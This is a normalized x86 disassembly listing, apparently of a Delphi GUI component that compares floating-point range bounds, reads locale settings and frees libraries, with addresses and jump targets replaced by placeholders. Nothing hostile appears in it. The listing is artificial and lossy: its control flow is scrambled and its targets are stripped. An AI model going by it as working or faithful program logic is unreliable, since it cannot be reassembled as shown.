push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee8c
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f10
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a5ec
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b748
call sub_403928
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40a5ec
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b748
call sub_403928
sub_43ee98
push ebx
mov ebx eax
mov eax ebx
call sub_450dd4
mov eax [ ebx + 0x208 ]
call sub_43ec58
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43f4bc
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43f304
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_43f440
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_43f1b0
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43f0a0
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43f60c
pop ebx
retn
sub_43ef34
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_43efe8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_4099b0
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_43f06d
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402984
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f0a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43f0a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409888
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43f60c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_43f128
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402984
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402984
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_43efb8
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_43f60c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43f1b0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_454120
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_429bf0
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_43f218
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43f2f0
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f2f7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43f4bc
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40a5ec
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b748
call sub_403928
sub_43f304
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_429b8c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_43f354
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43f42c
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f433
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43f4bc
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a5ec
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b748
call sub_403928
sub_43f440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_429c1c
sub_43f47c
cmp dl [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] dl
test dl dl
je r-xdata
xor edx edx
mov [ eax + 0x218 ] edx
mov [ eax + 0x21c ] edx
mov edx [ eax + 0x210 ]
mov [ eax + 0x218 ] edx
mov edx [ eax + 0x214 ]
mov [ eax + 0x21c ] edx
jmp r-xdata
call sub_4513bc
sub_43f4bc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402984
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402984
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402984
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402984
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43efe8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43efe8
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409888
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43f128
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409888
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43f128
jmp r-xdata
sub_43f60c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409888
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409888
mov eax ebx
call sub_454120
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43f0a0
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_453e1c
lea edx [ ebp - 0x20 ]
call sub_429ba4
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_43f718
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_43ecb4
mov edx 0xbf
mov eax esi
call sub_44cdf0
mov edx 0x9a
mov eax esi
call sub_44ce14
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43f770
push ebx
mov ebx eax
mov eax ebx
call sub_453378
mov eax ebx
call sub_454120
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_44e7e8
sub_43f798
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ecx [ esi + 0x8 ]
mov edx ecx
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd13
je r-xdata
lea edi [ ecx + 0xc ]
mov eax edi
call sub_43f708
test al al
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax edi
call sub_4098c8
fstp [ ebx + 0x210 ]
fwait
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x1c ]
shl edx 0x2
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
xor ecx ecx
call sub_402b80
cmp [ ebx + 0x24a ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
lea edi [ eax + 0x1c ]
mov eax edi
call sub_43f708
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x1c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax edi
call sub_4098c8
fstp [ ebx + 0x218 ]
fwait
inc eax
mov [ esp + 0xc ] eax
mov [ esp ] 0x0
mov edx [ esp + 0x4 ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
add [ esp + 0x4 ] 0x4
inc [ esp ]
dec [ esp + 0xc ]
jne r-xdata
sub eax 0xc
mov eax [ esp + 0x8 ]
movzx eax [ eax + 0xe ]
add eax [ esp ]
cmp eax 0xc
jle r-xdata
jmp r-xdata
sub_43f8a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4548b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_453e1c
lea edx [ ebp - 0x14 ]
call sub_429bbc
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ edi ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
cmp eax [ esi ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edi ] edx
mov [ esi ] eax
sub_43f910
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_450ca8
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_450bd4
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
or [ ebx + 0x4 ] eax
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43f964
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453e1c
mov ecx ebp
mov edx edi
call sub_429bd4
cmp eax 0xffffffff
setne bl
sub_43f998
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov bl 0x1
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453e1c
mov edx esp
call sub_429b74
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43f9d4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_453e1c
mov ecx ebp
mov edx edi
call sub_429c00
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43fa0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
mov eax esi
call sub_454120
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
mov eax esp
push eax
xor ecx ecx
mov edx 0x1009
mov eax esi
call sub_44e7e8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebp ] eax
jmp r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43fb1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43fb8b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb92
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40491c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40491c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43fde4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c82c
mov [ esi + 0x5 ] al
call sub_437140
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_440628
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43fe30
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_43fed0
call sub_42c66c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_43fe64
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43fed0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ff14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43fe64
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43ff60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43fe64
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ffa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43fe64
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_44000c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404738
push eax
mov eax esi
call sub_404728
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43fe64
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_440070
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4400f4
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_440130
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_44014d ]
jmp [ eax * 4 + jump_table_4401b6 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
